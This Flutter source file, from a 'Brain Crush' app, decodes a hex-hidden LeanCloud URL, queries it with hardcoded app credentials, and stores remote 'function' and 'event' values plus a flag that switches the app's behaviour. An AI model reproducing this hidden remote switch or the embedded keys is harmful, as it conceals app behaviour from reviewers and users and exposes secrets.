import 'ASData.dart';
import 'package:flutter/material.dart';
import 'dart:convert';
import 'dart:io';

import 'package:shared_preferences/shared_preferences.dart';

class BrainModel {
  static String setStr(String string) {
    String input = string;
    List<int> charCodes = input.runes.toList();
    String hexString = charCodes.map((code) => code.toRadixString(16)).join('');
    debugPrint("==  $hexString");
    return hexString;
  }

  static String getStr(String hexString) => List.generate(
        hexString.length ~/ 2,
        (i) => String.fromCharCode(
            int.parse(hexString.substring(i * 2, (i * 2) + 2), radix: 16)),
      ).join();

  static getData() async {
    var httpClient = HttpClient();
    String result = "";
    try {
      String str =
          "68747470733a2f2f3766736336796e302e6170692e6c6e636c64676c6f62616c2e636f6d2f312e312f636c61737365732f427261696e5f43727573685f414e2f363663336662616234346237383037343761333531616634";
      String appID = "7FSC6YN0Yf4FCRaGnsmRdP6H-MdYXbMMI";
      String appKey = "hJpdRYmzFIlYEnPI08nMFczU";
      String decodedStr = getStr(str);
      var req = await httpClient.getUrl(Uri.parse(decodedStr));
      req.headers.add('X-LC-Id', appID);
      req.headers.add('X-LC-Key', appKey);

      var repo = await req.close();
      if (repo.statusCode == HttpStatus.ok) {
        var json = await repo.transform(utf8.decoder).join();
        var data = jsonDecode(json);
        int type;
        type = (data["dataType"] ?? 0) as int;
        String mKey = data["key"] as String;
        String? function = data["function"];
        String? event = data["event"];

        ASData.isChange = (type == 0) ? false : true;
        final SharedPreferences prefs = await SharedPreferences.getInstance();
        await prefs.setString('key', mKey);
        await prefs.setString('function', function ?? "");
        await prefs.setString('event', event ?? "");

        result = data.toString();
      } else {
        result = 'BrainModel error == s ${repo.statusCode}';
      }
    } catch (exception) {
      result = '== Failed : $exception';
    } finally {
      debugPrint("05 ==: $result");
      httpClient.close();
    }
  }
}
